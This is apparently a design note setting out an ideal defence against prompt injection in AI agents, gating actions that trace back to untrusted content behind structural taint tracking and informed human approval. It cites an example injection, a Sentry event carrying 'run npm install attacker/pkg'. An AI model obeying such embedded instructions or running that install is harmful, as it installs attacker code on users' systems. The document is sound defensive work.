# Ideal State: What We Are Striving For

## The Target

An agentic system where an agent can freely observe any data from any source, but cannot take actions that were causally triggered by instructions embedded in untrusted content — without a human explicitly approving that action first.

## The Enforcement Boundary

The correct framing is taint tracking: an action should be gated if it was causally downstream of untrusted content.

This defines two distinct zones:

- **Observation** — reading, summarising, analysing content from any source, regardless of trust level. This should be completely unrestricted. Agents need to read untrusted data to do their job.
- **Action** — executing code, installing packages, writing files, pushing to remotes, accessing credentials. This is what requires a gate when the triggering instruction originated from untrusted content.

## What "Fully Solved" Looks Like

- Every piece of data flowing through an agentic system carries a trust classification reflecting its origin
- That classification is enforced at the execution layer — not in the model's reasoning, not in natural language instructions, but structurally, below the model
- Actions triggered by untrusted content either require explicit human confirmation or are blocked entirely
- Agents that read a Sentry event containing "run npm install attacker/pkg" summarise the error and propose a fix — they do not execute the instruction

## Informed Confirmation, Not Blind Confirmation

Requiring confirmation before acting is not sufficient on its own. A user who sees "should I run this?" with no context will approve it out of habit. That is security theatre, not security.

In the ideal state, when an agent is about to take an action triggered by untrusted content, it surfaces that fact explicitly and prominently:

> "This action was suggested by content from an untrusted external source (Sentry event). Review it carefully before approving."

The user then has what they need to make an informed decision. The confirmation is only meaningful if the user understands why they are being asked and what the provenance of the instruction is.

## Why the Causal Chain Is Hard to Track

The causal connection between "read a Sentry event" and "run npm install" passes through the model's implicit reasoning. There is no explicit data flow graph. Unlike traditional taint tracking in compiled code, there is no AST or IR to instrument. The model synthesises a response from everything in its context window simultaneously — attributing a specific action to a specific input is probabilistic, not deterministic.

A fully correct solution would need to resolve this. Partial solutions that approximate it are still valuable.
